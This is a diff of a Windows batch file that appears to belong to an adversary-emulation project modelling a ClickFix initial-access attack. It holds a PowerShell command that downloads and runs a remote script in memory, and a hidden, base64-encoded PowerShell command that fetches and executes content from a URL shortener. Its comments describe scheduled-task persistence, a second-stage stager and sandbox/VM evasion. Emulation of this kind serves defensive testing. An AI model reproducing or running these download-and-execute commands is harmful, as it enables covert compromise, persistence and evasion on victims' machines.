@@ -1,6 +1,7 @@
-:: Initial Access through Click-Fix
-:: Open Run Terminal and paste the below code
-
+:: Initial Access : Click-Fix
+::    Concept:
+::      - Click-Fix creates Scheduled Task to execute stager
+::      - Stager grabs secondary payload to check for VM and then start persistence
 
 :: Iteration 1:
 :: 		powershell.exe -c "iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/taskScheduler.bat' -UseBasicParsing).Content"
@@ -17,3 +18,17 @@
 
 conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIAbAAuAGMAbwBtAC8AbQB2AHkAZQBqADIANAByACAAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA== /W 1"
 
+
+:: Initial Access : Check for VM | Sandbox
+::    Concept:
+::      - Download and execute second script in memory
+::      - Check for VM or Sandbox
+::          - VM | Sandbox Detected
+::              - Do nothing
+::          - No VM | Sandbox Detected
+::              - Create second stager as Scheduled Task
+
+
+:: Initial Access : Second Stager Scheduled Task
+::    Concept:
+::       - 
